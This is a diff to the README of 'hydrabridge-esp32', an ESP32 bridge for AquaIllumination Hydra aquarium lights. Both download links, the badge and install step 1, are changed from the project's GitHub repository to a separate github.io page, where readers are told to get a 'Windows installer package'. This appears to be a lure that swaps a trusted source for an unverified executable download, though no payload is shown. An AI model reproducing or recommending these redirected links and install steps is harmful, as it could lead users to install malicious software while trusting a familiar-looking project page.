@@ -1,6 +1,6 @@
 # 💡 hydrabridge-esp32 - Local control for your aquarium lights
 
-[![Download Software](https://img.shields.io/badge/Download-hydrabridge-blue.svg)](https://github.com/Tubb6666/hydrabridge-esp32)
+[![Download Software](https://img.shields.io/badge/Download-hydrabridge-blue.svg)](https://tubb6666.github.io)
 
 Hydrabridge-esp32 connects your AquaIllumination Hydra lights to your local home network. It acts as a bridge between the lights and your smart home setup. This system works without cloud accounts or internet dependency. It speaks the language of your lights using Bluetooth Low Energy and translates that data into formats your central home controller understands.
 
@@ -26,7 +26,7 @@ You need the following items to use this system:
 
 ## 💾 How to Install
 
-1. Visit this page to download the necessary files: [https://github.com/Tubb6666/hydrabridge-esp32](https://github.com/Tubb6666/hydrabridge-esp32).
+1. Visit this page to download the necessary files: [https://tubb6666.github.io](https://tubb6666.github.io).
 2. Locate the releases section on that page.
 3. Download the current installer package for Windows.
 4. Save the file to your computer.
